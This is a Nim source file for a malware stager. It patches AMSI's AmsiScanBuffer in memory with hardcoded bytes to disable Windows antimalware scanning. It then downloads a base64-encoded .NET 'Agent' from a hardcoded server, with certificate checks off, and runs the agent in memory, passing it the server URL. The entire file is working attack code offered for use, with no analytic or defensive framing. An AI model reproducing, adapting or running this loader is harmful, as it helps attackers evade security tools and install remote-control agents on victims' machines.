import std/base64
import winim/clr
import strformat

import winim/lean
import dynlib
import strenc

import puppy

const ServerUrl {.strdefine.}: string = "https://192.168.56.102:443/wh/"
const FileName {.strdefine.}: string = "Agent.b64"
const DotNetParams {.strdefine.}: string = "https://192.168.56.102:443"

func toByteSeq*(str: string): seq[byte] {.inline.} =
    ## Converts a string to the corresponding byte sequence.
    @(str.toOpenArrayByte(0, str.high))

when defined amd64:
    when not defined(release):
        echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    when not defined(release):
        echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        when not defined(release):
            echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        when not defined(release):
            echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        when not defined(release):
            echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled



var url = ServerUrl  &  FileName
when not defined(release):
    echo "Downloading " & url

let req = Request(
    url: parseUrl(url),
    verb: "get",
    allowAnyHttpsCertificate: true,
)
let res = fetch(req)
when not defined(release):
    echo res.code
    echo res.headers
    echo res.body.len

if res.code != 200:
    quit(QuitFailure)

var content = res.body
let decoded = decode(content)
var bytes = toByteSeq(decoded)
when not defined(release):
    echo bytes.len()

when not defined(release):  
    echo "[*] Installed .NET versions"
    for v in clrVersions():
        echo fmt"    \--- {v}"
    echo "\n"

    echo ""



var success = PatchAmsi()
when not defined(release):
    echo fmt"[*] AMSI disabled: {bool(success)}"

var assembly = load(bytes)

when not defined(release):
    echo fmt"[*] Starting .NET Assembly whit Params : {DotNetParams}"
var arr = toCLRVariant([DotNetParams], VT_BSTR) # Actually passing some args
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
